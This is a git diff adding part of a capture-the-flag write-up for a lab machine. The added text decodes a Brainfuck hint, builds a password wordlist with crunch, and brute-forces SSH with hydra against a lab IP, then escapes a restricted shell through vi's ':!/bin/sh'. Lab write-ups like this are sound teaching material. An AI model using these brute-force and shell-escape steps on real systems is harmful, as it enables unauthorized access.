@@ -27,5 +27,56 @@ At this point, I started to feel blocked. After minutes of unsuccessful enumerat
 
 The Cypher is actually braincode, when interprate it gives :
 
-```You can enter into matrix as guest, with password k1ll0rXX
-Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password```
+```
+You can enter into matrix as guest, with password k1ll0rXX
+Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password
+```
+
+This hint tell us cleary to bruteforce guest user.
+
+## Bruteforce
+
+Let's generate the password list using the hint.
+
+```
+❯❯ crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ -o wordlist.txt
+```
+
+then bruteforce on ssh :
+
+```
+❯❯ hydra -l guest -P wordlist.txt 172.20.10.12 ssh -t4
+[sip]
+[22][ssh] host: 172.20.10.12   login: guest   password: k1ll0r7n
+```
+
+Found it !
+
+Now, just have to :
+
+```
+ssh guest@172.20.10.12
+guest@porteus:~$ 
+```
+
+## Priv ESC
+
+### rbash
+
+The first thing we have to figured out is how to escape rbash.
+I go quite easily on it, cause of vi.
+Actually VI is authorized so i do :
+
+```
+vi
+:!/bin/sh
+sh-4.4$ bash
+guest@porteus:~$ ls
+Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  prog/
+```
+And then we are not using rbash anymore.
+
+
+
+
+
